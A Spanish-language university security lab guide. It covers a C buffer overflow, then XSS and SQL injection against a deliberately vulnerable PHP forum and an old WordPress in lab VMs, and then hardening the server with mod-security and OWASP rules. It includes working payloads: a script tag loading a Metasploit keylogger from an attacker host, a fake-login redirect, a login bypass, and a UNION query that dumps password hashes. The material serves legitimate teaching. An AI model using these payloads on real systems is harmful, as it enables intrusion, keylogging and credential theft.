Previo: reto de desbordamiento de buffer
========================================

1.  Compilar y ejecutar el siguiente código C (en una máquina GBU/Linux)

        #include <stdio.h>
        #include <string.h>
        #include <stdlib.h>
         
        char* crear_pin_aleatorio() {
                char* pin = (char *) malloc(5);;  
                srand(time(0));  // Inicializa generador de nos. aleatorios
                sprintf(pin, "%04d", rand()%10000);
                return pin;
        }

        int main(int argc, char *argv[]) {
                char pin_secreto[5];
                strcpy(pin_secreto, crear_pin_aleatorio());

                char pin_leido[5];
                printf("Introducir PIN: ");
                gets(pin_leido);   // No comprueba tamano de entrada

                if (strcmp(pin_leido, pin_secreto) == 0){
                   printf("Acceso concedido, pin correcto\n");
                }
                else {
                   printf("Acceso denegado, pin incorrecto\n");
                }

                printf("PISTA:\n pin secreto: %s\n pin leido: %s\n", pin_secreto,pin_leido);
        }

    El programa implementa un control de acceso muy simple (y sin
    sentido) basado en un pin aleatorio de 4 dígitos.

    El código es vulnerable a un desbordamiento del buffer derivado del
    uso de la función `gets()`

2.  Diseñar un esquema que permita aprovechar el desbordamiento de
    buffer para sobrepasar el control de acceso basado en pin aleatorio.
    Comprobar su funcionamiento.

    **Nota: ** En el caso de los equipos del laboratorio de prácticas (y
    de las distribuciones GNU/Linux recientes) se emplea una versión del
    compilador GCC que por defecto implementa la protección de la pila
    contra desbordamiento de buffer empleando *random canaries* (tanto
    para proteger la dirección de retorno como en los arrays
    *”grande”*), por lo que en situaciones normales no sería factible
    explotar esta vulnerabilidad.

    -   Para poder realizar el ejercicio propuesto en esos equipos es
        necesario compilar el código con la opción
        `-fno-stack-protector` que deshabilita la protección de pila.

                                $ gcc -fno-stack-protector -o desbordador desbordador.c
                                $ ./desbordador                    
                               

    -   En máquinas de 64 bits (arquitectura `x86_64`) el compilador GCC
        alinea las variables (tanto globales, como locales, como
        parámetros de llamada) en regiones de 16 bytes (128 bits) para
        simplificar el uso de las instrucciones y registros de 128 bits
        de las extensiones SSE/MMX que aceleran las operaciones en como
        flotante, fundamentalmente en aplicaciones multimedia
        (decodificación de video, etc).

        Es decir, por defecto, cada variable de la pila tiene asignado
        un espacio de 16 bytes, aunque su ”tamaño” real sea menor.

        -   Se sigue pudiendo forzar el desbordamiento, pero se ha de
            tener en cuenta que las variables implicadas realmente
            ocupan 16 bytes

        -   Se puede intentar deshabilitar este alineamiento de 128 bits
            y usar uno menor (32 bits en máquinas x86 ó 64 bits en
            x86\_64) con opciones como
            `-mno-sse -mprefered-stack-boundary=3` (64 bits = $8^3$)
            [depende de la versión concreta de GCC]

3.  Por defecto el compilador GCC compila el código con la opción
    `-fstack-protector-all` (protección de pila para dirección de
    retorno y arrays ”grandes”). ¿Cómo funciona este mecanismo de
    protección de pila en GCC y qué sucede cuando se introduce un PIN de
    gran tamaño (\> 5 bytes)?

4.  Comprobar lo que sucede si se sustituye la llamada a
    `gets(pin_leido)` por una llamada a `fgets(pin_leido, 4, stdin)`

Documentación a entregar
------------------------

**Entregable:** Documentar brevemente las cuestiones 2, 3 y 4 del
ejemplo de desbordamiento de buffer.

Entorno de pruebas
==================

Imágenes de partida

1.  Scripts de instalación

    -   para GNU/Linux:

        -   Ejecutar desde el directorio de descarga

                              alumno@pc:~$ bash ejercicio-modsecurity.sh
                              

    -   para MS Windows (Vista o superior):

        -   Ejecutar desde el directorio de descarga

                              Powershell.exe -executionpolicy bypass -file ejercicio-modsecurity.ps1
                              

    **NOTAS:**

    1.  En ambos scripts la variable `$DIR_BASE` especifica donde se
        descargarán las imágenes y se crearán las MVs.

        -   Por defecto en GNU/Linux será en `$HOME/SSI1516` y en
            Windows en `C:\\SSI1516`

        -   Puede modificarse antes de lanzar los scripts para hacer la
            instalación en otro directorio más conveniente (disco
            externo, etc)

    2.  Es posible descargar las imágenes comprimidas manualmente (o
        intercambiarlas con USB), basta descargar los archivos con
        extensión `.vdi.zip` de y copiarlos en el directorio anterior
        (`$DIR_BASE`) para que el script haga el resto.

2.  El script descargará las siguientes imágenes en el directorio
    `DIR_BASE` (`$HOME/SSI1516` ó `C:\\SSI1516`)

    -   `atacante.vdi` (1,7 GB comprimida, 4,2 GB descomprimida): Imagen
        VirtualBox de la máquina con el framework Metasploit y otras
        herramientas complementarias.

        Usuarios configurados.

          ****login****   ****password****
          --------------- ------------------
          `root`          `purple`
          `usuario1`      `usuario1`

    -   `base.vdi` (1,6 GB comprimida, 4,4 GB descomprimida): Imagen
        VirtualBox de la máquina ”víctima”

        Usuarios configurados.

          ****login****   ****password****
          --------------- ------------------
          `root`          `purple`
          `usuario1`      `usuario1`

    -   `swap2015.vdi`: Imagen VirtualBox de una unidad de disco
        formateada como SWAP

3.  Se pedirá un identificador (sin espacios) para poder reutilizar las
    versiones personalizadas de las imágenes creadas

4.  Arrancar las instancias <span>VirtualBOX</span> (si no lo hacen
    desde el script anterior) desde el interfaz gráfico o desde la línea
    de comandos.

        VBoxManage startvm ATACANTE2-<id>
        VBoxManage startvm MODSECURITY-<id>

    **Importante:** Después de finalizar cada ejercicio terminar la
    ejecución de la máquina virtual desde línea de comandos con
    `poweroff` o `sudo poweroff` o desde el interfaz gráfico LXDE.

Ejercicio 1: Vulnerabilidades típicas en aplicaciones web
=========================================================

Descripción
-----------

En este ejercicio veremos ejemplos simples de vulnerabilidades web.

Usaremos una aplicación PHP de muestra muy simplificada que no realiza
ningún tipo de comprobación de las entradas que recibe y que permite
Inyección de SQL (que usaremos para burlar la comprobación de login y
password) y XSS (*Cross Site Scripting*).

También veremos un ejemplo de software real, una versión antigua del
software para blogs WordPress, con vulnerabilidades de inyección SQL.

Por último en la máquina virtual se encuentran instaladas tres
aplicaciones web vulnerables para ser usadas con fines didácticos.

**PREVIO** (IMPORTANTE) Asegurar que están iniciados los servidores
Apache y MySQL.

-   Usando los comandos de control de `systemd`

        modsecurity:~# systemctl restart apache2.service
        modsecurity:~# systemctl restart mysql.service
          

-   Usando los comandos ”tradicionales” (son alias a los anteriores)

        modsecurity:~# service apache2 restart
        modsecurity:~# service mysql   restart
          

Aplicaciones vulnerables (Cross Site Scripting: XSS)
----------------------------------------------------

### Foro ”simple” vulnerable

En la máquina `modsecurity` hay una implementación de un foro de juguete
en PHP.

-   Código fuente en: `/var/www/foro`

-   Cuenta con 2 usuarios creados (`ana` y `pepe`) ambos con password
    `ssi`

Desde la máquina `atacante2`:

1.  Abrir la dirección `http://modsecurity.ssi.net/foro` en un navegador
    WEB

2.  Entrar como `ana` con password `ssi`

    -   Añadir un mensaje con una parte de su título o del cuerpo
        encerrada entre las etiquetas HTML de texto en negrita:
        (`<b>....</b>`)

    -   Revisar la lista de mensajes para comprobar que las marcas HTML
        incluidas en las entradas entrada se copian tal cuales

3.  Preparar un ataque de XSS persistente

    -   El usuario `ana` se loguea con la contraseña `ssi` y crea otro
        mensaje nuevo, incluyendo en el texto la siguiente etiqueta
        `<script>` con comandos JavaScript

                        <script> alert(''esto admite XSS'') </script>
                        

    -   Desde otro navegador de la máquina `atacante` [en modo
        ”incógnito” para garantizar una nueva sesión] acceder a la URL
        `http://modsecurity.ssi.net/foro` con las credenciales del
        usuario `pepe` (con password `ssi`) y entrar en el listado de
        mensajes

    -   Se comprueba la ejecución del código del ”ataque” XSS preparado
        por `ana`

### Carga de librerías Javascript ”maliciosas”

En un escenario real, un atacante (el papel de `ana`) inyectaría código
Javascript más dañino, normalmente con la finalidad de hacerse con
información relevante del usuario atacado (el papel de `pepe`).

-   Típicamente se trataría de ”robar” cookies o información de la
    sesión abierta por el usuario atacado desde su navegador, para
    almacenarla con la finalidad de suplantar la sesión de un usuario
    legítimo

-   Otra alternativa usual consistiría en incluir código para cargar
    librerías Javascript maliciosas externas para hacerse con el control
    del navegador del usuario víctima (por ejemplo el ).

**Ejemplo:** despliegue del *keylogger* Javascript de Metasploit

1.  Preparar la librería Javascript y el servidor de escucha en la
    máquina `atacante2`.

    Información del módulo en

              atacante2:~#  msfconsole
              
              msf> use use auxiliary/server/capture/http_javascript_keylogger 
              
              http_javascript_keylogger> set DEMO true
              http_javascript_keylogger> set SRVPORT 8888
              http_javascript_keylogger> set URIPATH js
              http_javascript_keylogger> run
              

    El *keylogger* Javascript quedará disponible en cualquier URL de la
    forma <span>`http://atacante2.ssi.net:8888/js/[...].js`</span>, de
    modo que cuando se cargue esa librería Javascript se inicie la
    captura de pulsaciones de teclado.

2.  Desplegar el ataque XSS persistente

    -   Desde la máquina `atacante2` acceder al foro vulnerable como
        `ana` y crear un nuevo mensaje

            Título: Un mensaje 
                    inocente <script type="text/javascript" src="http://atacante2.ssi.net:8888/js/jquery.js"></script>
            Contenido: ...
                  

    -   Acceder como `pepe` [desde otro navegador] a la lista de
        mensajes para que se active el *keyloger*.

        Se accederá a la URL donde ”escucha” el keyloger de Metasploit y
        lo que se teclee en esa página será capturado.

3.  OPCIONAL: Simular la redirección a una página de lectura de
    credenciales

    -   **Importante: ** es mejor dejar esta prueba para el final,
        puesto que al ejecutarla impedirá comprobar el funcionamiento de
        las pruebas de XSS posteriores.

    El módulo Metasploit genera un página de login simulada (habilitado
    con la opción `DEMO=true`) en la URL
    <span>`http://atacante2.ssi.net:8888/js/demo`</span> para probar la
    redirección y captura de credenciales (en un escenario real se haría
    un ataque de phissing creando una página de login falsa imitando la
    apariencia de la web legítima)

    -   Desde `atacante2` acceder al foro como `ana` y crear un nuevo
        mensaje

            Título: Otro mensaje 
                    inocente <script> window.location.replace("http://atacante2.ssi.net:8888/js/demo") </script>
            Contenido: ...
                  

    -   Acceder como `pepe` a la lista de mensajes para invocar el
        código Javascript inyectado

        Se redireccionará el navegador a una página de login falsa
        creada por Metasploit donde capturará las pulsaciones de
        teclado.

Aplicaciones vulnerables (Inyección SQL)
----------------------------------------

### Inyección SQL Foro ”simple” vulnerable

Desde la máquina `atacante`

-   Volver a la página de inicial del foro:
    `http://modsecurity.ssi.net/foro`

-   Veremos como acceder sin disponer de nombre de usuario ni clave en
    la página de login.

    Indicar lo siguiente en la casilla usuario:

        usuario: ' or 1=1 ; #
        password: <vacío>
               

    Confirmamos cómo se accede la aplicación accede como un usuario
    autorizado (el primero de la base de datos)

    En la máquina `modsecurity`, comprobar cómo sería la consulta SQL
    que usará esos parámetros (ver el código en
    `/var/www/foro/login.php`)

        modsecurity:~# leafpad /var/www/html/foro/login.php &
                

### Inyección SQL en Wordpress 1.5.1.1

Ejemplo de vulnerabilidad en una versión antigua del software para blogs
.

Los ataques de Inyección SQL no tienen por que limitarse al acceso a
través de campos de formulario. En este caso el código SQL inyectado se
incluye en la barra de direcciones (en un parámetro de la URL que se
envía en la petición HTTP GET)

1.  Abrir desde el navegador de la máquina `atacante` la url del blog:
    `http://modsecurity.ssi.net/wordpress`

    -   No es necesario logearse para realizar el ejemplo, pero en caso
        necesario el usuario y el login de este blog son:

                      usuario: admin
                      passwd: secreto
                    

2.  Probaremos la inyección SQL sobre los parámetros de la consulta de
    categorias (`http://modsecurity.ssi.net/wordpress/?cat=1`)

    1.  Poner en barra de direcciones: (sin espacios)

            http://modsecurity.ssi.net/wordpress/index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users

        Nota: puede copiarse y pegarse esta URL desde el archivo
        `/root/aplicaciones_vulnerables/wordpress/url-wordpress.txt` de
        la máquina virtual `modsecurity`

    2.  Se mostrará en la columna derecha (zona de lista de categorías)
        el par:

              admin:e201994dca9320fc94336603b1cfc970

    3.  Vemos el contenido de la primera fila de la tabla de usuarios,
        con nombre de usuario `admin` y el md5 de su password

        Para comprobar que ese es efectivamente es el resumen md5 de la
        cadena `secreto`:

        -   Buscar la cadena `e201994dca9320fc94336603b1cfc970` en
            google (sale asociado a la palabra ”secreto”)

        -   Ejecutar en línea de comandos: `echo -n "secreto" | md5sum`

Aplicaciones vulnerables educativas
-----------------------------------

En la máquina virtual `modsecurity` se encuentra instaladas tres
aplicaciones vulnerables (2 en PHP y 1 en Java) diseñadas para
experimentar con ellas.

Damm Vulnerable Web App
:   disponible en `http://modsecurity.ssi.net/DVWA`, con login `admin` y
    password `password`

    Implementa ejemplos de XSS e inyección SQL y otras vulnerabilidades
    en tres niveles de dificultad

    El código está disponible en el directorio `/var/www/html/DVWA` de
    `modsecurity.ssi.net`.

    Web:

Mutillidae (NOWASP)
:   disponible en `http://modsecurity.ssi.net/mutillidae`

    Similar a DVWA, pero con los ejemplos más documentos y estructurados
    de acuerdo al OWASP Top 10.

    El código está disponible en el directorio
    `/var/www/html/mutillidae` de `modsecurity.ssi.net`.

    Web:

WebGoat
:   en `http://modsecurity.ssi.net:8080/WebGoat/`, con login `guest` y
    password `guest`

    Aplicación web Java vulnerable desarrollada como parte del proyecto
    OWASP.

    Instalación y arranque: desde el directorio
    `/root/aplicaciones-vulnerables/`

        modsecurity:/root/aplicaciones-vulnerables#  java -jar WebGoat-6.0.1-war-exec.jar

    Web:

Documentación a entregar
------------------------

**Entregable:**

-   Documentar las pruebas realizadas en los apartados 3.2 (Cross Site
    Scripting) y 3.3 (Inyección SQL), indicando los resultados
    obtenidos.

-   En el caso de las pruebas sobre el ”foro vulnerable” (secciones
    3.2.1 y 3.3.1) indicar si es posible los fragmentos de código fuente
    PHP del ”foro” que están implicados en dichas vulnerabilidades.

-   En el caso (opcional) de haber realizado alguna prueba adicional con
    las aplicaciones vulnerables educativas aportadas (DVWA, Mutillidae,
    WebGoat) documentar las mismas.

Ejercicio 2: Instalación y experimentación con mod-security
===========================================================

**NOTA:** Si es necesario para replicar los ejercicios anteriores, se
puede reconstruir la base de datos inicial del foro.

     modsecurity:~#  cd /var/www/html/foro
     modsecurity:/var/www/html/foro# mysql -u root -p     (con la contrseña purple)
     mysql > drop database foro
     mysql > create database foro
     mysql > use database foro
     mysql > source foro.sql
     

Descripción de mod-security
---------------------------

Resumen mod-security:

Web:

Reglas mod-security:

-   OWASP ModSecurity Core Rule Set Project:
    <https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project>

-   Atomi ModSecurity Rules:
    <http://www.atomicorp.com/wiki/index.php/Atomic_ModSecurity_Rules>

-   COMODO Web Application Firewall Rules: <https://waf.comodo.com/>
    (gratuitas con registro previo)

Instalación y configuración
---------------------------

1.  Instalar los paquetes debian (ya hecho)

        modsecurity:~# apt-get install  libapache2-mod-security2
          

2.  Descargar y descomprimir la reglas del OWASP ModSecurity Core Rule
    Set Project

    Descarga: y

    En la máquina `modsecurity` están en el directorio
    `/root/modsecurity`

        modsecurity:~# cd /root/modsecurity
        modsecurity:~# unzip owasp-modsecurity-crs-master.zip
        modsecurity:~# mv owasp-modsecurity-crs-master   /etc/modsecurity/owasp_rules
          

3.  Ajustar la configuración por defecto de mod-security e indicar el
    uso de las reglas

        modsecurity:~# cd /etc/apache2/
        modsecurity:~# nano mods-avaliable/security2.conf
          

    Editar `security2.conf` para añadir la carga de las reglas OWASP

        <IfModule security2_module>
                # Default Debian dir for modsecurity's persistent data
                SecDataDir /var/cache/modsecurity

                Include "/etc/modsecurity/modsecurity.conf"
                # Reglas OWASP  (anadido por SSI-1516)
                Include "/etc/modsecurity/owasp_rules/modsecurity_crs_10_setup.conf"
                Include "/etc/modsecurity/owasp_rules/activated_rules/*.conf"
        </IfModule>
          

4.  Configurar y habilitar las reglas OWASP a utilizar (inicialmente las
    `base_rules`)

        modsecurity:~# cd /etc/modsecurity/
        modsecurity:/etc/modsecurity/# mv modsecurity.conf-recommended   modsecurity.conf  /* Configuracion general de modsecurity*/
          

    <span>|l|</span>\
    **IMPORTANTE**\

    [t]<span>0.85</span>

    -   En la configuración por defecto de `mod-security` está
        habilitada la notificación del uso de `mod-security` a la web
        <http://status.modsecurity.org/>.

    -   Dado que las máquinas virtuales utilizadas no tienen acceso a la
        red real, este intento de notificación fallido hará que
        `mod-security` no se arranque.

    -   Para anular esta notificación hay que editar el fichero
        `/etc/modsecurity/modsecurity.conf` y establecer el parámetro
        `SecStatusEngine` a `Off` [está al final del fichero]

            modsecurity:~# nano /etc/modsecurity/modsecurity.conf

               ...
               ...    
               SecStatusEngine Off

              

    \

5.  Configurar las reglas OWASP

    Enlazar en el directorio `base_rules` los ficheros con las reglas a
    utilizar (en este caso el conjunto de reglas básico completo)

        modsecurity:/etc/modsecurity/# cd owasp_rules
        modsecurity:/etc/modsecurity/owasp_rules/# cp modsecurity_crs_10_setup.conf.example   modsecurity_crs_10_setup.conf 
                                                                                                /* Config. base de OWASP rules*/
        modsecurity:/etc/modsecurity/owasp_rules/# ln -s $PWD/base_rules/* activated_rules
          

6.  Si no estaba hecho previamente, habilitar el módulo `mod-security`
    en Apache y reiniciar el servidor

        modsecurity:~# a2enmod security2

        modsecurity:~# systemctl restart apache2.service
         ó
        modsecurity:~# service apache2 restart
          

7.  Repetir las pruebas de inyección SQL y XSS sobre el foro y wordpress

8.  `mod-security` estaba configurado en modo detección (ver
    `/etc/modsecurity/modsecurity.conf`).

    En `/var/log/apache2/` se pueden ver los ficheros de log con las
    reglas activadas (`access.log` , `error.log`, `modsec_audit.log`)

9.  Configurar `mod-security` en modo rechazo y repetir las pruebas de
    inyección SQL y XSS sobre el foro y wordpress

    Editar `/etc/modsecurity/modsecurity.conf` para establecer el
    parámetro `SecRuleEngine` a `On` (por defecto estaba como
    `DetectionOnly`) y reiniciar Apache.

          modsecurity:~# nano /etc/modsecurity/modsecurity.conf

           ...
           SecRuleEngine On
           ...
           

           
        modsecurity:~# systemctl restart apache2.service
         ó
        modsecurity:~# service apache2 restart
           

    **Nota: ** el acceso a las URL debe hacerse con el nombre de la
    máquina `modsecurity`, no con su dirección IP.
    (`http://modsecurity.ssi.net/foro`, etc)

Documentación a entregar
------------------------

**Entregable:**

-   Documentar las pruebas realizadas sobre las aplicaciones web
    vulnerables en los puntos 7 y 9 del ejemplo de instalación de
    Mod-Security, indicando los resultados obtenidos (si se considera
    oportuno, pueden mostrarse fragmentos de log relevantes, etc).


